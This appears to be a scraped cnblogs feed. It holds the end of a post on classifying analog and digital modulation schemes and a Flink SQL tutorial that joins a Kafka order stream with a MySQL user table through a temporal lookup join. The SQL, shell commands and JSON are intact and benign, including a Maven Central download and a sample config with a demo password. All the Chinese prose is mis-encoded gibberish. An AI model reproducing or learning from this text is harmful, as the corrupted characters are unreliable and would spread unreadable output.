ï¼Œæˆ‘ä»¬æ²¡æœ‰å»åˆ°æ¯”èµ›ç°åœºï¼Œä½†æ˜¯è¿˜æ˜¯å›½èµ›äºŒç­‰å¥–ï¼Œå°±ä¸çŒ®ä¸‘äº†ï¼‰</h3>\n<ul>\n<li>æ¨¡æ‹Ÿè°ƒåˆ¶å’Œæ•°å­—è°ƒåˆ¶ä¸¤ä¸ªå¤§ç±»çš„åŒºåˆ†(ä¸­å¿ƒè½½é¢‘ä¸ç›¸é‚»é¢‘ç‚¹ä¹‹é—´çš„è·ç¦»)</li>\n<li>ä¸‰ç§æ¨¡æ‹Ÿè°ƒåˆ¶çš„åŒºåˆ†(CW, AM, FM)</li>\n<li>ä¸‰ç§æ•°å­—è°ƒåˆ¶çš„åŒºåˆ†(ASK, FSK, PSK)</li>\n<li>å„ç§è°ƒåˆ¶è½½æ³¢é¢‘ç‡çš„è®¡ç®—(é¢‘è°±æœ€è¿‘ç›¸é‚»è°±çº¿çš„è·ç¦»)</li>\n<li>AMè°ƒåˆ¶çš„Maçš„è®¡ç®—(å¯»å³°ç®—æ³•)</li>\n<li>FMè°ƒåˆ¶çš„Mfçš„è®¡ç®—(åŸºäºæ¨¡å¼åŒ¹é…çš„æ€æƒ³)</li>\n<li>FSKè°ƒåˆ¶çš„hå‚æ•°çš„è®¡ç®—(åŸºäºå’ŒFMçš„ç›¸ä¼¼å¸¦æ¥çš„æ¨¡å¼å¤ç”¨)</li>\n<li>ASKçš„æŠ½åˆ¤(åŸºäºç›´æµé‡çš„å®šæ—¶æŠ½åˆ¤)</li>\n<li>FSKçš„æŠ½åˆ¤(ä¸¤è·¯FIRåçš„æŠ½åˆ¤)</li>\n<li>PSKçš„æŠ½åˆ¤(æ»¡è¶³ç‰¹å®šé¢‘ç‡çš„ç›¸ä½çªå˜ç‚¹æŠ½åˆ¤æ³•)</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 14:06</span>&nbsp;\n<a href=\"https://www.cnblogs.com/badboy02\">Badboy02</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">60</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ä»é›¶å¼€å§‹å­¦Flinkï¼šå®æ—¶æ•°ä»“ä¸ç»´è¡¨æ—¶æ€Joinå®æˆ˜",
      "link": "https://www.cnblogs.com/daimajiangxin/p/19624638",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/daimajiangxin/p/19624638\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-02-19 12:58\">\n    <span>ä»é›¶å¼€å§‹å­¦Flinkï¼šå®æ—¶æ•°ä»“ä¸ç»´è¡¨æ—¶æ€Joinå®æˆ˜</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        <img alt=\"ä»é›¶å¼€å§‹å­¦Flinkï¼šå®æ—¶æ•°ä»“ä¸ç»´è¡¨æ—¶æ€Joinå®æˆ˜\" class=\"desc_img\" src=\"https://img2024.cnblogs.com/blog/3365149/202602/3365149-20260219125729266-340455730.png\" />\n        ä»¥ç”µå•†è®¢å•å®æ—¶æ•°ä»“ä¸ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•åœ¨ Flink SQL ä¸­é€šè¿‡ç»´è¡¨æ—¶æ€ Join å°†äº‹å®æµä¸ç»´åº¦æ•°æ®å…³è”ï¼Œæ„å»ºå¸¦ç”¨æˆ·å±æ€§çš„æ˜ç»†å®½è¡¨ï¼Œå¹¶ç»“åˆ Kafka ä¸ MySQL ç¯å¢ƒå®Œæˆä¸€å¥—å¯è½åœ°çš„å®æ—¶æ•°ä»“å…¥é—¨å®è·µã€‚\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>åœ¨å‰ä¸€ç¯‡ <a href=\"https://mp.weixin.qq.com/s/kLxoo6mHi49HvrrmaOdTsA\" rel=\"noopener nofollow\" target=\"_blank\">ã€ŠFlink åŒæµ JOIN å®æˆ˜è¯¦è§£ã€‹</a> ä¸­ï¼Œæˆ‘ä»¬ç”¨ã€Œè®¢å•æµ + æ”¯ä»˜æµã€ææ‡‚äº†äº‹å®åŒæµä¹‹é—´çš„æ—¶é—´å…³è”ã€‚</p>\n<p>ä½†åœ¨çœŸå®çš„å®æ—¶æ•°ä»“é¡¹ç›®é‡Œï¼Œå…‰æœ‰äº‹å®æµè¿˜ä¸å¤Ÿï¼Œä¸šåŠ¡åŒå­¦æ›´å…³å¿ƒçš„æ˜¯ï¼š</p>\n<ul>\n<li>ä¸‹å•ç”¨æˆ·æ˜¯æ–°å®¢è¿˜æ˜¯è€å®¢</li>\n<li>ç”¨æˆ·å½“å‰çš„ç­‰çº§ã€åŸå¸‚ã€æ¸ é“</li>\n<li>å•†å“æ‰€å±å“ç±»ã€ç±»ç›®å±‚çº§</li>\n</ul>\n<p>è¿™äº›ä¿¡æ¯é€šå¸¸å­˜æ”¾åœ¨ <strong>ç»´åº¦è¡¨</strong>ï¼ˆç»´è¡¨ï¼‰ä¸­ï¼Œä¾‹å¦‚ MySQL çš„ <code>dim_user</code>ã€<code>dim_product</code> ç­‰ã€‚æˆ‘ä»¬å¸Œæœ›åœ¨å®æ—¶è®¡ç®—æ—¶ï¼Œèƒ½æŠŠã€Œäº‹å®æµã€å’Œã€Œç»´è¡¨ã€åœ¨æ—¶é—´ç»´åº¦ä¸Šæ­£ç¡®åœ°å…³è”èµ·æ¥ï¼Œæ„å»ºä¸€å¼ å¸¦æœ‰å®Œæ•´ä¸šåŠ¡å±æ€§çš„<strong>æ˜ç»†å®½è¡¨</strong>ã€‚</p>\n<p>è¿™å°±æ˜¯ <strong>ç»´è¡¨æ—¶æ€ Joinï¼ˆTemporal Table Joinï¼‰</strong> è¦è§£å†³çš„é—®é¢˜ã€‚</p>\n<p>æœ¬æ–‡æˆ‘ä»¬å°±ä»¥ã€Œè®¢å•äº‹å®æµ + ç”¨æˆ·ç»´è¡¨ã€ä¸ºä¾‹ï¼Œå®Œæˆä¸€ä¸ªä» Kafka åˆ° MySQL çš„ç®€æ˜“å®æ—¶æ•°ä»“ Demoï¼Œå¹¶é‡ç‚¹ç†è§£ Flink SQL ä¸­ç»´è¡¨æ—¶æ€ Join çš„è¯­æ³•å’Œæ³¨æ„äº‹é¡¹ã€‚</p>\n<h2 id=\"ä¸€ä¸šåŠ¡åœºæ™¯ä¸æ•°ä»“ç›®æ ‡\">ä¸€ã€ä¸šåŠ¡åœºæ™¯ä¸æ•°ä»“ç›®æ ‡</h2>\n<p>è®¾æƒ³ä¸€ä¸ªç®€åŒ–çš„ç”µå•†ä¸šåŠ¡åœºæ™¯ï¼š</p>\n<ul>\n<li>Kafka ä¸­æœ‰å®æ—¶å†™å…¥çš„ <code>orders</code> è®¢å•äº‹å®æµ</li>\n<li>MySQL ä¸­ç»´æŠ¤ä¸€å¼  <code>dim_user</code> ç”¨æˆ·ç»´è¡¨ï¼ŒåŒ…å«ç”¨æˆ·ç­‰çº§ã€æ‰€å±åŸå¸‚ã€æ³¨å†Œæ¸ é“ç­‰ä¿¡æ¯</li>\n</ul>\n<p>æˆ‘ä»¬æƒ³è¦åœ¨ Flink ä¸­æ„å»ºä¸€å¼ ã€Œ<strong>è®¢å•æ˜ç»†å®½è¡¨</strong>ã€ï¼Œå­—æ®µå¤§è‡´åŒ…æ‹¬ï¼š</p>\n<ul>\n<li>è®¢å•ä¿¡æ¯ï¼šè®¢å•å·ã€ä¸‹å•ç”¨æˆ·ã€ä¸‹å•é‡‘é¢ã€ä¸‹å•æ—¶é—´</li>\n<li>ç”¨æˆ·å±æ€§ï¼šç”¨æˆ·æ˜µç§°ã€ç­‰çº§ã€åŸå¸‚ã€æ³¨å†Œæ¸ é“</li>\n</ul>\n<p>å¹¶ä¸”è¦æ±‚ï¼š</p>\n<ul>\n<li>å½“æˆ‘ä»¬å›çœ‹ 10 åˆ†é’Ÿå‰çš„æŸæ¡è®¢å•æ—¶ï¼Œçœ‹åˆ°çš„æ˜¯ <strong>å½“æ—¶</strong> ç”¨æˆ·çš„ç­‰çº§å’ŒåŸå¸‚ï¼Œè€Œä¸æ˜¯è¢«åç»­å˜æ›´â€œå†²æ‰â€çš„æœ€æ–°å€¼</li>\n</ul>\n<p>è¿™æ­£æ˜¯ <strong>æ—¶æ€ Join</strong> å’Œã€Œå®æ—¶æ•°ä»“ã€çš„å…³é”®ï¼š<strong>æŒ‰äº‹ä»¶å‘ç”Ÿæ—¶åˆ»å›æ”¾ç»´åº¦è§†å›¾</strong>ã€‚</p>\n<h2 id=\"äºŒç¯å¢ƒå‰æä¸ä¾èµ–å‡†å¤‡\">äºŒã€ç¯å¢ƒå‰æä¸ä¾èµ–å‡†å¤‡</h2>\n<h3 id=\"1-åŸºç¡€ç»„ä»¶\">1. åŸºç¡€ç»„ä»¶</h3>\n<p>æœ¬ç¯‡é»˜è®¤ä½ å·²ç»å®Œæˆå‰å‡ ç¯‡ä¸­çš„ç¯å¢ƒå‡†å¤‡ï¼š</p>\n<ul>\n<li>Flink 1.20.1ï¼ˆWSL2 Ubuntu ä¸‹éƒ¨ç½²ï¼‰</li>\n<li>Kafka é›†ç¾¤å·²å¯åŠ¨ï¼Œä¸”èƒ½æ­£å¸¸å†™å…¥ / è¯»å– Topic</li>\n<li>Flink SQL Client å¯ä»¥æ­£å¸¸è¿æ¥é›†ç¾¤</li>\n</ul>\n<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬è¿˜éœ€è¦ï¼š</p>\n<ul>\n<li>ä¸€å¥—å¯è®¿é—®çš„ MySQLï¼ˆæœ¬åœ°æˆ–è¿œç¨‹å‡å¯ï¼‰</li>\n<li>Flink çš„ JDBC Connector JAR åŒ…</li>\n</ul>\n<h3 id=\"2-å®‰è£…-flink-jdbc-connector\">2. å®‰è£… Flink JDBC Connector</h3>\n<p>å’Œ Kafka ä¸€æ ·ï¼ŒJDBC è¿æ¥å™¨ä¹Ÿéœ€è¦ä»¥ JAR åŒ…å½¢å¼æ”¾åˆ° Flink çš„ <code>lib</code> ç›®å½•ä¸­ã€‚</p>\n<p>ä»¥ Flink 1.20.x å¯¹åº”çš„ <code>flink-connector-jdbc</code> ä¸ºä¾‹ï¼š</p>\n<ol>\n<li>\n<p>ç¡®è®¤ Flink å®‰è£…ç›®å½•ï¼ˆå‡è®¾ä¸º <code>/opt/flink</code>ï¼‰ï¼š</p>\n<pre><code class=\"language-bash\">export FLINK_HOME=/opt/flink\n</code></pre>\n</li>\n<li>\n<p>ä¸‹è½½ JDBC Connector JAR åˆ° Flink çš„ <code>lib</code> ç›®å½•ï¼š</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME/lib\nwget https://repo1.maven.org/maven2/org/apache/flink/flink-connector-jdbc/3.3.0-1.20/flink-connector-jdbc-3.3.0-1.20.jar\n</code></pre>\n</li>\n<li>\n<p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ç‹¬ç«‹é›†ç¾¤æˆ–è¿œç¨‹é›†ç¾¤ï¼Œéœ€è¦é‡å¯ Flink é›†ç¾¤ï¼Œè®©æ–° JAR åœ¨ JobManager/TaskManager ä¸Šç”Ÿæ•ˆï¼š</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/stop-cluster.sh\nbin/start-cluster.sh\n</code></pre>\n</li>\n<li>\n<p>é‡å¯ Flink SQL Clientï¼Œä½¿ç”¨æ–° Connectorï¼š</p>\n<pre><code class=\"language-bash\">cd $FLINK_HOME\nbin/sql-client.sh\n</code></pre>\n</li>\n</ol>\n<p>å¦‚æœä½ åœ¨ Windows + WSL2 ä¸Šéƒ¨ç½²ï¼Œåªéœ€åœ¨ WSL2 å†…æ‰§è¡Œä¸Šè¿°å‘½ä»¤å³å¯ï¼›æˆ–è€…æ‰‹åŠ¨ä¸‹è½½ JAR åæ‹·è´åˆ° <code>lib</code> ç›®å½•ï¼Œæ­¥éª¤å®Œå…¨ä¸€è‡´ã€‚</p>\n<h2 id=\"ä¸‰å‡†å¤‡-mysql-ç”¨æˆ·ç»´åº¦è¡¨-dim_user\">ä¸‰ã€å‡†å¤‡ MySQL ç”¨æˆ·ç»´åº¦è¡¨ dim_user</h2>\n<p>é¦–å…ˆåœ¨ MySQL ä¸­å‡†å¤‡ä¸€å¼ ç®€å•çš„ç”¨æˆ·ç»´åº¦è¡¨ï¼Œç”¨æ¥å­˜ç”¨æˆ·çš„åŸºç¡€å±æ€§ã€‚</p>\n<p>åœ¨ MySQL ä¸­æ‰§è¡Œï¼š</p>\n<pre><code class=\"language-sql\">CREATE DATABASE IF NOT EXISTS realtime_dwh;\nUSE realtime_dwh;\n\nCREATE TABLE dim_user (\n  user_id      VARCHAR(32)  PRIMARY KEY,\n  user_name    VARCHAR(64),\n  user_level   VARCHAR(16),\n  city         VARCHAR(64),\n  register_time DATETIME\n);\n\nINSERT INTO dim_user (user_id, user_name, user_level, city, register_time) VALUES\n('u_1', 'å¼ ä¸‰', 'VIP1', 'åŒ—äº¬', '2025-12-01 10:00:00'),\n('u_2', 'æå››', 'VIP2', 'ä¸Šæµ·', '2025-12-05 11:00:00'),\n('u_3', 'ç‹äº”', 'VIP1', 'å¹¿å·', '2025-12-10 12:00:00');\n</code></pre>\n<p>ä¸ºäº†æ¼”ç¤ºã€Œæ—¶æ€ã€æ•ˆæœï¼Œä½ å¯ä»¥åœ¨åç»­å®éªŒä¸­æ‰‹åŠ¨æ›´æ–°æŸä¸ªç”¨æˆ·çš„ç­‰çº§æˆ–åŸå¸‚ï¼Œä¾‹å¦‚ï¼š</p>\n<pre><code class=\"language-sql\">UPDATE dim_user\nSET user_level = 'VIP3'\nWHERE user_id = 'u_2';\n</code></pre>\n<p>è¿™æ ·æˆ‘ä»¬åœ¨ Flink é‡Œåšæ—¶æ€ Join æ—¶ï¼Œå°±èƒ½è§‚å¯Ÿâ€œå˜æ›´å‰åâ€çš„åŒºåˆ«ã€‚</p>\n<h2 id=\"å››åœ¨-flink-ä¸­æ³¨å†Œäº‹å®æµä¸ç»´è¡¨\">å››ã€åœ¨ Flink ä¸­æ³¨å†Œäº‹å®æµä¸ç»´è¡¨</h2>\n<p>æ¥ä¸‹æ¥å›åˆ° Flink SQL Clientï¼ŒæŠŠ Kafka ä¸­çš„è®¢å•äº‹å®æµå’Œ MySQL ä¸­çš„ç»´è¡¨éƒ½æ³¨å†Œæˆ Flink è¡¨ã€‚</p>\n<h3 id=\"1-kafka-è®¢å•äº‹å®è¡¨-orders\">1. Kafka è®¢å•äº‹å®è¡¨ orders</h3>\n<p>å’Œä¸Šä¸€ç¯‡åŒæµ JOIN ç±»ä¼¼ï¼Œæˆ‘ä»¬å‡è®¾ Kafka ä¸­æœ‰ä¸€ä¸ª <code>orders</code> Topicï¼Œå†™å…¥è®¢å•äº‹å®æ•°æ®ã€‚</p>\n<p>åœ¨ Flink SQL Client ä¸­æ‰§è¡Œï¼š</p>\n<pre><code class=\"language-sql\">CREATE TABLE orders (\n  order_id     STRING,\n  user_id      STRING,\n  order_amount DECIMAL(10, 2),\n  order_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND,\n  proc_time AS PROCTIME()\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'orders',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-orders-dim',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n</code></pre>\n<p>ä½ å¯ä»¥æ²¿ç”¨ä¸Šä¸€ç¯‡ä¸­ Kafka é€ æ•°çš„æ–¹å¼ï¼Œç”¨ <code>kafka-console-producer.sh</code> å‘é€ JSON è®¢å•æ•°æ®ï¼Œåªéœ€è¦ä¿è¯å­—æ®µåä¸€è‡´ã€‚</p>\n<h3 id=\"2-mysql-ç”¨æˆ·ç»´è¡¨-dim_userjdbc-lookup-è¡¨\">2. MySQL ç”¨æˆ·ç»´è¡¨ dim_userï¼ˆJDBC Lookup è¡¨ï¼‰</h3>\n<p>ç„¶åæŠŠåˆšæ‰åœ¨ MySQL ä¸­å»ºå¥½çš„ <code>dim_user</code> æ³¨å†Œä¸º Flink çš„ JDBC è¡¨ï¼š</p>\n<pre><code class=\"language-sql\">CREATE TABLE dim_user (\n  user_id       STRING,\n  user_name     STRING,\n  user_level    STRING,\n  city          STRING,\n  register_time TIMESTAMP(3),\n  PRIMARY KEY (user_id) NOT ENFORCED\n) WITH (\n  'connector' = 'jdbc',\n  'url' = 'jdbc:mysql://127.0.0.1:3306/realtime_dwh',\n  'table-name' = 'dim_user',\n  'driver' = 'com.mysql.cj.jdbc.Driver',\n  'username' = 'root',\n  'password' = '1qaz@WSX'\n);\n</code></pre>\n<p>æ³¨æ„å‡ ç‚¹ï¼š</p>\n<ul>\n<li><code>PRIMARY KEY (user_id) NOT ENFORCED</code> å‘Šè¯‰ Flink è¿™æ˜¯ä¸€å¼ ä»¥ <code>user_id</code> ä¸ºä¸»é”®çš„è¡¨ï¼Œæ˜¯åšæ—¶æ€ Join çš„å‰æ</li>\n<li>è¿™é‡Œä½¿ç”¨çš„æ˜¯å…¸å‹çš„ JDBC Lookup æ¨¡å¼ï¼ŒFlink ä¼šåœ¨ Join æ—¶æŒ‰éœ€å» MySQL æŸ¥ç»´åº¦ä¿¡æ¯</li>\n</ul>\n<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä½ å¯ä»¥æŠŠ MySQL ä½œä¸ºç»´åº¦å­˜å‚¨ï¼Œæˆ–è€…é€šè¿‡ CDC æŠŠç»´è¡¨å˜æ›´åŒæ­¥åˆ° Kafkaï¼Œæ„é€ æˆ changelog æµï¼Œè¿™äº›éƒ½å¯ä»¥å’Œ Temporal Join ç»“åˆä½¿ç”¨ã€‚</p>\n<h2 id=\"äº”ç»´è¡¨æ—¶æ€-joinæŠŠè®¢å•æ‰“ä¸Šç”¨æˆ·ç»´åº¦\">äº”ã€ç»´è¡¨æ—¶æ€ Joinï¼šæŠŠè®¢å•æ‰“ä¸Šç”¨æˆ·ç»´åº¦</h2>\n<p>æœ‰äº†è®¢å•äº‹å®è¡¨ <code>orders</code> å’Œç»´åº¦è¡¨ <code>dim_user</code>ï¼Œå°±å¯ä»¥é€šè¿‡æ—¶æ€ Join æ¥æ„å»ºè®¢å•æ˜ç»†å®½è¡¨ã€‚</p>\n<h3 id=\"1-åŸºç¡€æ—¶æ€-join-è¯­æ³•\">1. åŸºç¡€æ—¶æ€ Join è¯­æ³•</h3>\n<p>Flink SQL ä¸­çš„ Temporal Table Join å¯¹äº JDBC è¿™ç±» <strong>å¤–éƒ¨ç»´è¡¨</strong>ï¼Œé€šå¸¸é‡‡ç”¨ã€Œå¤„ç†æ—¶é—´ï¼ˆProcessing Timeï¼‰ã€è¯­ä¹‰æ¥åš Lookup Joinï¼Œå…¸å‹å†™æ³•å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-sql\">SELECT\n  o.order_id,\n  o.user_id,\n  d.user_name,\n  d.user_level,\n  d.city,\n  o.order_amount,\n  o.order_time\nFROM orders AS o\nLEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d\nON o.user_id = d.user_id;\n</code></pre>\n<p><img alt=\"FlinkJoin\" class=\"lazyload\" /><br />\nè¿™é‡Œæœ‰å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>\n<ul>\n<li><code>proc_time AS PROCTIME()</code> æ˜¯åœ¨ <code>orders</code> ä¸Šå®šä¹‰çš„å¤„ç†æ—¶é—´å­—æ®µ</li>\n<li><code>FOR SYSTEM_TIME AS OF o.proc_time</code> è¡¨ç¤ºâ€œä»¥ Flink å¤„ç†è¿™æ¡è®¢å•è®°å½•çš„å½“å‰æ—¶é—´ï¼Œå»æŸ¥ç»´è¡¨çš„ä¸€ä¸ªå¿«ç…§â€ï¼Œè¿™æ˜¯ JDBC Lookup æ”¯æŒçš„å…¸å‹ç”¨æ³•</li>\n<li>Join æ¡ä»¶ä¾ç„¶æ˜¯ <code>user_id</code> ç­‰å€¼å…³è”</li>\n<li>ä½¿ç”¨ <code>LEFT JOIN</code> å¯ä»¥ä¿ç•™æ‰¾ä¸åˆ°ç»´åº¦çš„è®¢å•ï¼Œå¹¶ç”¨ç©ºå€¼æ¥è¡¨ç¤ºâ€œç»´åº¦ç¼ºå¤±â€</li>\n</ul>\n<p>åœ¨ SQL Client ä¸­æ‰§è¡Œè¿™æ®µæŸ¥è¯¢ï¼Œä¼šçœ‹åˆ°å®æ—¶æµå¼åˆ·æ–°çš„ç»“æœï¼Œæ¯ä¸€è¡Œè®¢å•éƒ½å¸¦ä¸Šäº†å¯¹åº”çš„ç”¨æˆ·å±æ€§ã€‚</p>\n<h3 id=\"2-éªŒè¯æ—¶æ€æ•ˆæœä¿®æ”¹ç»´è¡¨å†è§‚å¯Ÿ-join\">2. éªŒè¯æ—¶æ€æ•ˆæœï¼šä¿®æ”¹ç»´è¡¨å†è§‚å¯Ÿ Join</h3>\n<p>ä¸ºäº†éªŒè¯è¿™æ˜¯â€œæ—¶æ€ Joinâ€è€Œä¸æ˜¯â€œå§‹ç»ˆæŸ¥æœ€æ–°ç»´åº¦â€ï¼Œå¯ä»¥æŒ‰ä¸‹é¢æ­¥éª¤æ“ä½œï¼š</p>\n<ol>\n<li>\n<p>å…ˆå¾€ Kafka çš„ <code>orders</code> Topic å†™å…¥å‡ æ¡è®¢å•æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ· <code>u_2</code> ä¸‹å•çš„è®°å½•</p>\n</li>\n<li>\n<p>è§‚å¯Ÿ Flink SQL ä¸­ Join åçš„ç»“æœï¼Œæ­¤æ—¶ <code>u_2</code> çš„ç­‰çº§æ˜¯ <code>VIP2</code></p>\n</li>\n<li>\n<p>å›åˆ° MySQLï¼Œæ‰§è¡Œï¼š</p>\n<pre><code class=\"language-sql\">UPDATE dim_user\nSET user_level = 'VIP3'\nWHERE user_id = 'u_2';\n</code></pre>\n</li>\n<li>\n<p>å†å†™å…¥ä¸€æ‰¹æ–°çš„è®¢å•ï¼Œä»ç„¶æ˜¯ç”¨æˆ· <code>u_2</code></p>\n</li>\n</ol>\n<pre><code class=\"language-bash\">bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic orders\n</code></pre>\n<p>åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä¸€æ¡ JSON æ•°æ®ï¼ˆæŒ‰å›è½¦å‘é€ä¸€æ¡ï¼‰ï¼š</p>\n<pre><code class=\"language-json\">{\"order_id\":\"o_3\",\"user_id\":\"u_2\",\"order_amount\":200.00,\"order_time\":\"2026-02-19T14:42:00Z\"}\n</code></pre>\n<p><img alt=\"FlinkJoin\" class=\"lazyload\" /><br />\nè¿™æ—¶ä½ ä¼šçœ‹åˆ°ï¼š</p>\n<ul>\n<li>å˜æ›´å‰çš„è®¢å•ï¼Œç»´åº¦å­—æ®µä»ç„¶æ˜¾ç¤º <code>VIP2</code></li>\n<li>å˜æ›´åçš„è®¢å•ï¼Œç»´åº¦å­—æ®µå˜æˆäº† <code>VIP3</code></li>\n</ul>\n<p>è¿™å°±è¯´æ˜ Flink çš„æ—¶æ€ Join ç¡®å®æ˜¯â€œæŒ‰è®¢å•å‘ç”Ÿæ—¶åˆ»å»å›æ”¾ç»´åº¦è§†å›¾â€çš„ï¼Œè€Œä¸æ˜¯ç®€å•æŸ¥å½“å‰æœ€æ–°å€¼ã€‚</p>\n<h2 id=\"å…­æŠŠç»“æœå†™å›-kafka-æˆ–-mysqlå½¢æˆå®æ—¶æ•°ä»“æ˜ç»†å±‚\">å…­ã€æŠŠç»“æœå†™å› Kafka æˆ– MySQLï¼Œå½¢æˆå®æ—¶æ•°ä»“æ˜ç»†å±‚</h2>\n<p>åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬ä¸ä¼šåªåœ¨ SQL Client é‡Œ <code>SELECT</code> ä¸€ä¸‹å°±ç»“æŸï¼Œè€Œæ˜¯è¦æŠŠ Join åçš„è®¢å•æ˜ç»†å®½è¡¨ï¼Œå†™å›åˆ°ä¸‹æ¸¸å­˜å‚¨ï¼Œå½¢æˆå®æ—¶æ•°ä»“çš„ä¸€ä¸ªå±‚çº§ã€‚</p>\n<p>ä¾‹å¦‚ï¼Œå¯ä»¥æŠŠç»“æœå†™å› Kafkaï¼Œä½œä¸º DWD å±‚çš„è®¢å•å®½è¡¨ï¼š</p>\n<pre><code class=\"language-sql\">CREATE TABLE dwd_order_user_wide (\n  order_id     STRING,\n  user_id      STRING,\n  user_name    STRING,\n  user_level   STRING,\n  city         STRING,\n  order_amount DECIMAL(10, 2),\n  order_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'dwd_order_user_wide',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-dwd-order-wide',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n\nINSERT INTO dwd_order_user_wide\nSELECT\n  o.order_id,\n  o.user_id,\n  d.user_name,\n  d.user_level,\n  d.city,\n  o.order_amount,\n  o.order_time\nFROM orders AS o\nLEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d\nON o.user_id = d.user_id;\n</code></pre>\n<p>è¿™æ ·ï¼Œä¸‹æ¸¸çš„å®æ—¶åº”ç”¨æˆ– BI æŸ¥è¯¢å°±å¯ä»¥ç›´æ¥è®¢é˜… <code>dwd_order_user_wide</code> è¿™ä¸ª Topicï¼Œæ‹¿åˆ°å·²ç»æ‰“å¥½ç”¨æˆ·æ ‡ç­¾çš„è®¢å•æ˜ç»†æ•°æ®ã€‚</p>\n<p>ä½ ä¹Ÿå¯ä»¥æŠŠç»“æœåŒæ­¥åˆ° MySQLã€ClickHouse ç­‰åˆ†æå‹æ•°æ®åº“ä¸­ï¼Œæ„å»ºå®æ—¶æ˜ç»†è¡¨ï¼Œä¸ºæŠ¥è¡¨å’Œå¯è§†åŒ–æä¾›æ•°æ®ã€‚</p>\n<h2 id=\"ä¸ƒå°ç»“ä¸ä¸‹ä¸€æ­¥å»ºè®®\">ä¸ƒã€å°ç»“ä¸ä¸‹ä¸€æ­¥å»ºè®®</h2>\n<p>é€šè¿‡è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬å®Œæˆäº†è¿™æ ·ä¸€ä»¶äº‹ï¼š</p>\n<ul>\n<li>åœ¨ Kafka ä¸­ç»´æŠ¤è®¢å•äº‹å®æµ <code>orders</code></li>\n<li>åœ¨ MySQL ä¸­ç»´æŠ¤ç”¨æˆ·ç»´åº¦è¡¨ <code>dim_user</code></li>\n<li>ä½¿ç”¨ Flink SQL çš„ JDBC Connector æŠŠ MySQL æ³¨å†Œä¸ºç»´è¡¨</li>\n<li>åˆ©ç”¨ <code>FOR SYSTEM_TIME AS OF</code> è¯­æ³•åšç»´è¡¨æ—¶æ€ Join</li>\n<li>å°† Join ç»“æœå†™å› Kafkaï¼Œå½¢æˆå®æ—¶æ•°ä»“ä¸­çš„ä¸€å¼ è®¢å•æ˜ç»†å®½è¡¨</li>\n</ul>\n<p>è¿™èƒŒåæœ‰å‡ ä¸ªéå¸¸é‡è¦çš„å®æ—¶æ•°ä»“è®¾è®¡ç†å¿µï¼š</p>\n<ul>\n<li>äº‹å®æµæ˜¯ä¸æ–­è¿½åŠ çš„äº‹ä»¶åºåˆ—ï¼Œç»´è¡¨æ˜¯ç›¸å¯¹ç¼“æ…¢å˜æ›´çš„ä¸šåŠ¡è§†å›¾</li>\n<li>æ—¶æ€ Join è®©ä½ èƒ½å¤Ÿâ€œæŒ‰äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´ç‚¹â€ï¼Œå›çœ‹å½“æ—¶çš„ç»´åº¦å¿«ç…§</li>\n<li>å®æ—¶æ•°ä»“çš„ DWD å±‚ï¼Œå¾€å¾€å°±æ˜¯ã€Œäº‹å®è¡¨ + å¤šä¸ªç»´è¡¨æ—¶æ€ Joinã€åå½¢æˆçš„æ˜ç»†å®½è¡¨</li>\n</ul>\n<p>åœ¨åç»­çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æ²¿ç€è¿™ä¸ªæ–¹å‘æ·±å…¥ï¼š</p>\n<ul>\n<li>åœ¨ä¸€ä¸ªä»»åŠ¡é‡ŒåŒæ—¶å…³è”å¤šå¼ ç»´è¡¨ï¼Œæ„å»ºæ›´å®½çš„æ˜ç»†è¡¨</li>\n<li>å¼•å…¥ CDCï¼ŒæŠŠç»´è¡¨å˜æ›´å®æ—¶åŒæ­¥åˆ° Kafkaï¼Œå†åœ¨ Flink ä¸­æ„å»º changelog ç»´è¡¨</li>\n<li>æŠŠå®æ—¶æ•°ä»“çš„æ˜ç»†å±‚ã€æ±‡æ€»å±‚ï¼ˆDWSï¼‰ã€æŒ‡æ 